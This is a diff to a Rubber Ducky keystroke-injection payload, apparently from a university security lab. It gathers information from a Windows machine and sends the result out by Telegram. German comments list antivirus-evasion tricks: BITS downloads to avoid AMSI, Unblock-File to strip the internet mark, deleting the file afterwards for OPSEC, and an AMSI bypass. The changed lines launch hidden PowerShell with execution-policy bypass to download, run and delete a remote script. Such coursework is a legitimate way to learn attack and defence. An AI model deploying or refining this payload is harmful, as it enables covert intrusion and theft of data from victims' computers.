@@ -3,16 +3,22 @@ REM  W02a.2 - Rubber Ducky: Information Gathering
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows (x64 + ARM64)
 REM
-REM  Laedt info_gather.ps1 fileless von GitHub.
+REM  Laedt info_gather.ps1 von GitHub, fuehrt aus, loescht Datei.
 REM  Ergebnis kommt per Telegram als Datei.
 REM
-REM  AV-Evasion:
-REM    - cmd.exe Elternprozess (explorer->cmd->ps, nicht explorer->ps)
-REM    - [scriptblock]::Create() statt IEX (AMSI-Hook umgehen)
-REM    - URL in $u isoliert: trennt Download-Aufruf von Execute
+REM  AV-Evasion / Reliability:
+REM    - %ComSpec% = voller Pfad zu cmd.exe (immer gefunden)
+REM    - BITS (Background Intelligent Transfer Service) statt
+REM      WebClient + IEX/scriptblock (AMSI-Hook umgehen)
+REM    - BITS nutzt Windows-eigenen Download-Dienst (Windows Update),
+REM      selten von AV geflaggt
+REM    - Unblock-File entfernt Zone.Identifier ADS (Internet-Markierung)
+REM    - Kein IEX, kein scriptblock, kein WebClient im Run-Befehl
+REM    - Temp-Datei wird nach Ausfuehrung geloescht (OPSEC)
+REM    - AMSI-Bypass + String-Obfuskierung im PS1-Script selbst
 REM ============================================================
 
 DELAY 2000
 GUI r
-DELAY 600
-STRINGLN cmd /c powershell -nop -noni -w h -ep bypass -c "$u='https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1';& ([scriptblock]::Create([Net.WebClient]::new().DownloadString($u)))"
+DELAY 1000
+STRINGLN %ComSpec% /c powershell -nop -ep bypass -w h -c "Import-Module BitsTransfer;Start-BitsTransfer 'https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/info_gather.ps1' $env:TEMP\r.ps1;Unblock-File $env:TEMP\r.ps1;& $env:TEMP\r.ps1;ri $env:TEMP\r.ps1 -f -ea 0"
